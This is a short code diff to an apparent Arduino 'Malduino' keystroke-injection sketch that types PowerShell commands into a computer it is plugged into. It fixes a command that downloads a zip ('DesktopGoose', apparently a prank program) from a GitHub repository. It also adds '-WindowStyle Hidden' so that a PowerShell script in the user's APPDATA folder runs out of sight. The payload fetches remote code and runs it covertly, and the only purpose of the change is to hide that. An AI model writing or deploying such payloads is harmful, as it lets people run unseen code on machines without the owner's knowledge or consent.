@@ -108,8 +108,7 @@ void setup(){
     delay(100);
 
     delay(defaultDelay);
-    Keyboard.print("Invoke-WebRequest -OutFile ducky.zip https://github.com/danperks/Malduino-Scripts/raw/master/1%20-%20AnnoyingGoose/DesktopGoose.zipcmd
-    ");
+    Keyboard.print("Invoke-WebRequest -OutFile ducky.zip https://github.com/danperks/Malduino-Scripts/raw/master/1%20-%20AnnoyingGoose/DesktopGoose.zip");
 
     delay(defaultDelay);
     delay(100);
@@ -191,7 +190,7 @@ void setup(){
     delay(300);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -file $env:APPDATA\\ducky\\ducky.ps1");
+    Keyboard.print("powershell.exe -WindowStyle Hidden -file $env:APPDATA\\ducky\\ducky.ps1");
 
     delay(defaultDelay);
     delay(100);
